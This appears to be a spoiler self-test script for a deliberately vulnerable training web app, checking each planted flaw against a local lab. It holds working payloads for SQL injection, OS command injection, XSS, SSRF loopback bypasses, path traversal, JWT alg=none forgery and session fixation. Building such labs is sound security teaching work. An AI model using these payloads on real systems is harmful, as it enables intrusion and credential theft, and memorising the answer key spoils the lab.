#!/usr/bin/env python3
"""
Ashford Hire - end-to-end verification of every intended finding (SPOILERS).

Usage:  python3 tests/selftest.py [base_url]        default http://127.0.0.1:8100
Run it against a FRESH deployment and run ./reset.sh afterwards - it creates
bookings and throwaway accounts.
"""
import base64
import hashlib
import json
import random
import re
import string
import sys
import time

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8100").rstrip("/")
RESULTS = []


def check(num, name, ok, detail=""):
    RESULTS.append((num, name, bool(ok)))
    print(f"[{'PASS' if ok else 'FAIL'}] #{num:02d} {name}" + (f"  ({detail})" if detail else ""))


def sess():
    s = requests.Session()
    s.headers["User-Agent"] = "ashford-selftest"
    return s


def rvt(s, path):
    html = s.get(BASE + path).text
    m = re.search(r'name="__rvt" type="hidden" value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(s, user, pw):
    t = rvt(s, "/signin")
    r = s.post(BASE + "/signin", data={"username": user, "password": pw, "__rvt": t}, allow_redirects=False)
    return r.status_code == 302 and "/signin" not in r.headers.get("Location", "")


def rand(n=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def register(s, username, pw, answer):
    t = rvt(s, "/register")
    r = s.post(BASE + "/register", data={
        "fullName": "Test " + username, "username": username, "email": f"{username}@example.test",
        "phone": "07700 900000", "company": "", "password": pw, "confirm": pw,
        "securityQuestion": "What was the name of your first pet?", "securityAnswer": answer, "__rvt": t
    }, allow_redirects=False)
    return r.status_code == 302


def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).decode().rstrip("=")


def book(s, slug, notes, cookies=None):
    t = rvt(s, f"/equipment/{slug}")
    start = time.strftime("%Y-%m-%d", time.gmtime(time.time() + 3 * 86400))
    r = s.post(BASE + f"/equipment/{slug}/book", data={
        "StartDate": start, "Days": "3", "DeliveryPostcode": "LS10 1RW", "SiteNotes": notes,
        "CardNumber": "4242424242424242", "CardExpiry": "12/29", "CardCvc": "123", "__rvt": t
    }, cookies=cookies, allow_redirects=False)
    return r.headers.get("Location", "")


def main():
    print(f"Target: {BASE}\n")
    j = sess()
    assert login(j, "jordan", "Summer2024"), "jordan login failed - is the lab running and fresh?"
    disp = sess()
    dispatcher_ok = login(disp, "dispatch.qa", "Yard!2024")

    # 1 path traversal
    r1 = requests.get(BASE + "/equipment/manuals/download", params={"file": "....//....//....//....//etc/passwd"})
    r1b = requests.get(BASE + "/equipment/manuals/download", params={"file": "/etc/passwd"})
    check(1, "Path traversal - operator manual download", "root:x:0:0" in r1.text and "root:x:0:0" in r1b.text)

    # 2 CSRF on recovery details (no token, cross-site style request)
    r2 = requests.post(BASE + "/my/security/recovery", data={"securityAnswer": "csrf-was-here"},
                       cookies={"ash_session": j.cookies.get("ash_session")}, headers={"Origin": "http://evil.test"},
                       allow_redirects=False)
    v = sess()
    t = rvt(v, "/account/recover")
    v.post(BASE + "/account/recover", data={"step": "1", "username": "jordan", "__rvt": t})
    r2b = v.post(BASE + "/account/recover", data={"step": "2", "username": "jordan", "answer": "csrf-was-here", "__rvt": t})
    check(2, "CSRF - account recovery details", r2.status_code == 302 and "New password" in r2b.text)
    j.post(BASE + "/my/security/recovery", data={"securityAnswer": "Transit"})

    # 3 directory listing
    r3 = requests.get(BASE + "/staging/")
    check(3, "Directory listing - /staging/", "users_export_2024-09-14.csv" in r3.text and "deploy-notes" in r3.text)

    # 4 SSRF via webhook test
    t = rvt(j, "/my/integrations")
    blocked = j.post(BASE + "/my/integrations/test", data={"url": "http://127.0.0.1:8080/internal/telematics/config", "__rvt": t}).text
    bypass_ok = []
    for u in ["http://127.0.0.2:8080/internal/telematics/config", "http://0.0.0.0:8080/internal/telematics/config",
              "http://[::ffff:127.0.0.1]:8080/internal/telematics/config", "http://2130706433:8080/internal/telematics/config",
              "http://127.1:8080/internal/telematics/config"]:
        body = j.post(BASE + "/my/integrations/test", data={"url": u, "__rvt": t}).text
        if "FLAG{webhooks_should_not_phone_home}" in body:
            bypass_ok.append(u.split("/")[2])
    direct = requests.get(BASE + "/internal/telematics/config").status_code
    check(4, "SSRF - webhook test reaches loopback-only endpoint",
          "isn&#x27;t allowed" in blocked and bypass_ok and direct == 404, "bypasses: " + ", ".join(bypass_ok))

    # 5 secrets in client-side source map
    js = requests.get(BASE + "/js/app.min.js").text
    smap = requests.get(BASE + "/js/app.min.js.map").text
    check(5, "Credentials in JS source map", "sourceMappingURL=app.min.js.map" in js and "dispatch.qa / Yard!2024" in smap and dispatcher_ok)

    # 6 CORS
    hdr_null = j.get(BASE + "/api/v2/account", headers={"Origin": "null"}).headers
    hdr_sub = j.get(BASE + "/api/v2/account", headers={"Origin": "http://ashfordhire.attacker.test"}).headers
    hdr_evil = j.get(BASE + "/api/v2/account", headers={"Origin": "http://evil.test"}).headers
    check(7, "CORS - null / partner-regex origin trusted with credentials",
          hdr_null.get("Access-Control-Allow-Origin") == "null" and hdr_null.get("Access-Control-Allow-Credentials") == "true"
          and hdr_sub.get("Access-Control-Allow-Origin") == "http://ashfordhire.attacker.test"
          and "Access-Control-Allow-Origin" not in hdr_evil)

    # 7 environment exposure
    r7 = requests.get(BASE + "/healthz", params={"verbose": "true"}).text
    check(8, "Environment/config exposure - /healthz?verbose=true", "FLAG{healthz_said_far_too_much}" in r7 and "ashford_app" in r7)

    # 8 cookie flags
    sc = requests.get(BASE + "/").headers.get("Set-Cookie", "")
    check(9, "Session cookie without HttpOnly/Secure/SameSite", "ash_session=" in sc and "httponly" not in sc.lower() and "samesite" not in sc.lower())

    # 9/10 vulnerable components
    jq = requests.get(BASE + "/lib/jquery/jquery-3.4.1.min.js").text
    mo = requests.get(BASE + "/lib/moment/moment-2.29.1.min.js").text
    home = requests.get(BASE + "/").text
    check(10, "Known-vulnerable jQuery 3.4.1", "jQuery v3.4.1" in jq and "jquery-3.4.1" in home)
    check(11, "Known-vulnerable Moment.js 2.29.1", '"2.29.1"' in mo and "moment-2.29.1" in home)

    # 11 cleartext
    r11 = requests.get(BASE + "/signin")
    check(12, "Cleartext HTTP, no HSTS", BASE.startswith("http://") and "Strict-Transport-Security" not in r11.headers)

    # 16 SQLi (and 12 weak hash) via depot API
    blocked = requests.get(BASE + "/api/v2/depots", params={"region": "x' UNION SELECT 1,2,3,4,5--"}).status_code
    payload = "x' UNION ALL SELECT Username,PasswordHash,Role,Email,CAST(Id AS nvarchar(10)) FROM Users--"
    rows = requests.get(BASE + "/api/v2/depots", params={"region": payload}).json().get("depots", [])
    flagrow = requests.get(BASE + "/api/v2/depots", params={"region": "x' UNION ALL SELECT Name,Value,Notes,Notes,Notes FROM OpsSecrets--"}).text
    t_true = len(requests.get(BASE + "/api/v2/depots", params={"region": "West Yorkshire' AND 1=1--"}).json().get("depots", []))
    t_false = len(requests.get(BASE + "/api/v2/depots", params={"region": "West Yorkshire' AND 1=2--"}).json().get("depots", []))
    t0 = time.time()
    requests.get(BASE + "/api/v2/depots", params={"region": "x';WAITFOR DELAY '0:0:3'--"})
    slow = time.time() - t0
    admin_hash = next((r.get("name") for r in rows if r.get("code") == "admin"), "")
    check(17, "SQL injection - depot API (UNION/boolean/time)",
          blocked == 400 and admin_hash and "FLAG{union_all_the_way_to_the_ops_table}" in flagrow and t_true > 0 and t_false == 0 and slow >= 3,
          f"filter=400, boolean {t_true}/{t_false}, delay {slow:.1f}s")
    check(13, "Weak unsalted SHA-1 password hashes", admin_hash == hashlib.sha1(b"trustno1").hexdigest())

    # 13 command injection (dispatcher)
    t = rvt(disp, "/yard/service")
    semi = disp.post(BASE + "/yard/service/export", data={"sku": "EXC-018", "bundleName": "x;id", "__rvt": t}).text
    sub = disp.post(BASE + "/yard/service/export", data={"sku": "EXC-018", "bundleName": "$(id)", "__rvt": t}).text
    tick = disp.post(BASE + "/yard/service/export", data={"sku": "EXC-018", "bundleName": "`cat .yard-token`", "__rvt": t}).text
    check(14, "OS command injection - service bundle name",
          "allowed" in semi and "uid=" in sub and "FLAG{tar_balls_and_shell_calls}" in tick)

    # 14 reflected XSS
    p1 = "<img src=x onerror=alert(document.domain)>"
    p2 = "<scr<script>ipt>alert(1)</scr</script>ipt>"
    r14a = requests.get(BASE + "/availability", params={"postcode": p1}).text
    r14b = requests.get(BASE + "/availability", params={"postcode": p2}).text
    r14c = requests.get(BASE + "/availability", params={"postcode": "<script>alert(1)</script>"}).text
    check(15, "Reflected XSS - delivery postcode check",
          p1 in r14a and "<script>alert(1)</script>" in r14b and "<script>alert(1)</script>" not in r14c)

    # 15 stored XSS in driver notes
    xss = "<img src=x onerror=alert('stored-xss')>"
    loc = book(j, "cement-mixer-110v", xss)
    detail = j.get(BASE + loc).text if loc else ""
    board = disp.get(BASE + "/yard").text
    check(16, "Stored XSS - driver site notes (customer page + dispatch board)", xss in detail and xss in board)

    # 17 mass assignment
    m = sess()
    mu = "ma_" + rand()
    register(m, mu, "Password123!", "rex")
    login(m, mu, "Password123!")
    before = m.get(BASE + "/yard", allow_redirects=False).status_code
    r17 = m.put(BASE + "/api/v2/account", json={"fullName": "Mass Assign", "email": f"{mu}@example.test", "role": "dispatcher", "accountType": "trade"}).json()
    r17b = m.put(BASE + "/api/v2/account", json={"fullName": "Mass Assign", "email": f"{mu}@example.test", "role": "admin"}).json()
    after = m.get(BASE + "/yard").status_code
    check(18, "Mass assignment - role via PUT /api/v2/account",
          before == 403 and r17.get("role") == "dispatcher" and r17b.get("role") == "dispatcher" and after == 200)

    # 18 clickjacking
    h_settings = j.get(BASE + "/my/settings").headers
    h_other = j.get(BASE + "/my").headers
    check(19, "Clickjacking - /my/settings frameable",
          "X-Frame-Options" not in h_settings and "Content-Security-Policy" not in h_settings and h_other.get("X-Frame-Options") == "DENY")

    # 19 JWT alg=none -> admin
    forged = b64url({"alg": "none", "typ": "JWT"}) + "." + b64url({"sub": "admin", "exp": int(time.time()) + 3600}) + "."
    who = requests.get(BASE + "/api/v2/account", headers={"Authorization": "Bearer " + forged}).json()
    a = sess()
    a.get(BASE + "/auth/handoff", params={"token": forged})
    dash = a.get(BASE + "/admin").text
    check(20, "Improper authentication - unsigned JWT accepted (+ web handoff)",
          who.get("username") == "admin" and "FLAG{head_office_dashboard_unlocked}" in dash)

    # 20 no lockout on API token endpoint (web login locks)
    lu = "lk_" + rand()
    lk = sess()
    register(lk, lu, "Correct-Horse1", "rex")
    for _ in range(6):
        login(sess(), lu, "wrong-password")
    web_locked = "temporarily locked" in (lambda s: (s.post(BASE + "/signin", data={"username": lu, "password": "Correct-Horse1", "__rvt": rvt(s, "/signin")}).text))(sess())
    for _ in range(15):
        requests.post(BASE + "/api/v2/auth/token", json={"username": lu, "password": "nope"})
    api_ok = requests.post(BASE + "/api/v2/auth/token", json={"username": lu, "password": "Correct-Horse1"}).status_code == 200
    check(21, "No lockout/rate limit on API token endpoint", web_locked and api_ok)

    # 21 session fixation via shared estimate link
    attacker = sess()
    attacker.get(BASE + "/")
    sid = attacker.cookies.get("ash_session")
    victim = sess()
    victim.get(BASE + "/estimate/resume", params={"ref": sid})
    fixed = victim.cookies.get("ash_session") == sid
    login(victim, "lucy.b", "sunshine1")
    hijack = attacker.get(BASE + "/my").text
    check(22, "Session fixation - /estimate/resume?ref=", fixed and "Lucy" in hijack)

    # 22 weak password recovery (username swapped at step 3)
    au, vu = "ra_" + rand(), "rv_" + rand()
    register(sess(), au, "Attacker-Pass1", "rex")
    register(sess(), vu, "Victim-Pass1", "whiskers")
    r = sess()
    t = rvt(r, "/account/recover")
    r.post(BASE + "/account/recover", data={"step": "1", "username": au, "__rvt": t})
    r.post(BASE + "/account/recover", data={"step": "2", "username": au, "answer": "rex", "__rvt": t})
    done = r.post(BASE + "/account/recover", data={"step": "3", "username": vu, "newPassword": "Owned-Pass1", "confirmPassword": "Owned-Pass1", "__rvt": t}).text
    check(23, "Weak password recovery - step 3 trusts hidden username", "password has been changed" in done and login(sess(), vu, "Owned-Pass1"))

    # 23 pricing cookie tampering
    free = base64.b64encode(json.dumps({"tier": "trade", "discount": 100}).encode()).decode().rstrip("=")
    host = re.sub(r"^https?://([^/:]+).*$", r"\1", BASE)
    j.cookies.set("ash_pricing", free, domain=host, path="/")
    loc = book(j, "telehandler-7m", "price test")
    page = j.get(BASE + loc).text if loc else ""
    check(24, "Client-side pricing cookie trusted (GBP 0.00 hire)", "Total paid</dt><dd><strong>&pound;0.00</strong>" in page)

    # 24 insecure deserialization (Json.NET TypeNameHandling)
    quotes = j.get(BASE + "/my/quotes").text
    qid = re.search(r"/my/quotes/(\d+)/export", quotes).group(1)
    doc = json.loads(base64.b64decode(j.get(BASE + f"/my/quotes/{qid}/export").content))
    doc["Terms"]["TemplatePath"] = "/etc/passwd"
    t = rvt(j, "/my/quotes")
    imp = j.post(BASE + "/my/quotes/import", data={"payload": base64.b64encode(json.dumps(doc).encode()).decode(), "__rvt": t}).text
    doc["Terms"]["$type"] = "Ashford.Web.Nope, Ashford.Web"
    err = j.post(BASE + "/my/quotes/import", data={"payload": json.dumps(doc), "__rvt": t}).text
    check(25, "Insecure deserialization - quote import ($type gadget)", "root:x:0:0" in imp and "Error resolving type" in err)

    # 25 sensitive data in logs
    act = disp.get(BASE + "/yard/activity").text
    check(26, "Sensitive data in logs - yard activity feed", "password=" in act and "card=4242424242424242" in act and "cvc=" in act)

    # 26 verbose errors
    r26 = j.get(BASE + "/api/v2/hires", params={"page": "abc"})
    check(27, "Verbose exception details - /api/v2/hires?page=", r26.status_code == 500 and "System.FormatException" in r26.text and "stackTrace" in r26.text)

    # 27 IDOR
    agr = j.get(BASE + "/my/hires/1/agreement").text
    own = j.get(BASE + "/my/hires/1").status_code
    check(6, "IDOR - hire agreement of another customer", "Megan Price" in agr and own == 404)

    RESULTS.sort()
    passed = sum(1 for r in RESULTS if r[2])
    print(f"\n{passed} passed, {len(RESULTS) - passed} failed")
    sys.exit(0 if passed == len(RESULTS) else 1)


if __name__ == "__main__":
    main()
